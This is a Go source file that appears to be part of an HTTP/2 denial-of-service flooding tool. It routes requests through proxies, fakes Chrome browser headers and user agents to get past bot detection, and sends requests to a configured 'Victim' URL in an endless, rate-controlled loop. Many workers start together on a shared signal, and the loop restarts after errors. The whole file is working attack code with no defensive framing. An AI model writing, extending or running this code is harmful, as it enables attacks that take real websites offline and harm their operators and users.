package main

import (
	"fmt"
	"golang.org/x/net/http2"
	"math/rand"
	"net/http"
	url2 "net/url"
	"sync"
	"time"
)

var start = make(chan bool)

func HTTP2(wg *sync.WaitGroup) {
	var errs int
	errs = -1
	restart:
	proxy := LoadedProxies[0]
	
	//fmt.Println(proxy)
	//fmt.Println(LoadedProxies)
	url, err := url2.Parse(fmt.Sprintf("http://%s", proxy))
	
	x, err := url.Parse(Sys.Attack.Url)
	if err != nil {
		fmt.Println("Error by Parsing Victim. Check Victim url.")
		return
	}
	Http2ProxyConfig := &http.Transport{
		Proxy: http.ProxyURL(url),
	}
	_, err = http2.ConfigureTransports(Http2ProxyConfig)
	if err != nil {
		fmt.Println("Can't upgrade to http2")
		return
	}
	client := http.Client{
		Timeout: time.Duration(Sys.HTTP2Timeout)*time.Millisecond,
		Transport: Http2ProxyConfig,
	}
	req, err := http.NewRequest(Sys.Attack.AttackMethod, Sys.Attack.Url, nil)
	if err != nil {
		fmt.Println("Can't build Request")
		return
	}
	if Sys.Attack.Host != "" {
		req.Header.Set("Host", Sys.Attack.Host)
	}
	if Sys.Attack.Cookie != nil {
		req.Header.Add("cookie", Sys.Attack.Cookie.(string))
	}
	
	if (Sys.Attack.Jokeragent != nil) && (len(Sys.Attack.Jokeragent.(string)) > 0) {
		req.Header.Set("User-Agent", Sys.Attack.Jokeragent.(string))
	} else {
		req.Header.Set("User-Agent", UserAgents[rand.Intn(len(UserAgents))])
	}
	
	req.Header.Set("authority", x.Host)
	req.Header.Set("method", "GET")
	req.Header.Set("scheme", "https")
	req.Header.Set("sec-fetch-site", "same-origin")
	req.Header.Set("sec-Fetch-User", "?1")
	req.Header.Set("sec-Fetch-Mode", "navigate")
	req.Header.Set("sec-Fetch-Dest", "document")
	req.Header.Set("sec-ch-ua", "\"Chromium\";v=\"104\", \" Not A;Brand\";v=\"99\", \"Google Chrome\";v=\"104\"")
	req.Header.Set("sec-ch-ua-platform", "Windows")
	req.Header.Set("sec-ch-ua-mobile", "?0")
	req.Header.Set("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
	req.Header.Set("accept-language", "en-US,en;q=0.9")
	req.Header.Set("accept-encoding", "gzip, deflate, br")
	req.Header.Set("sec-gpc", "1")
	req.Header.Set("cache-control", "max-age=0")
	req.Header.Set("pragma", "no-cache")
	req.Header.Set("upgrade-insecure-requests", "1")

	if errs == -1 {
		wg.Done()
		<-start
	}
	for range time.Tick(time.Millisecond*time.Duration(1000.0/Sys.Attack.RequestsPerIP)) {
		_, err = client.Do(req)
		if err != nil {
			errs++
			if errs > 10 {
				errs=0
				goto restart
			}
		}
	}
}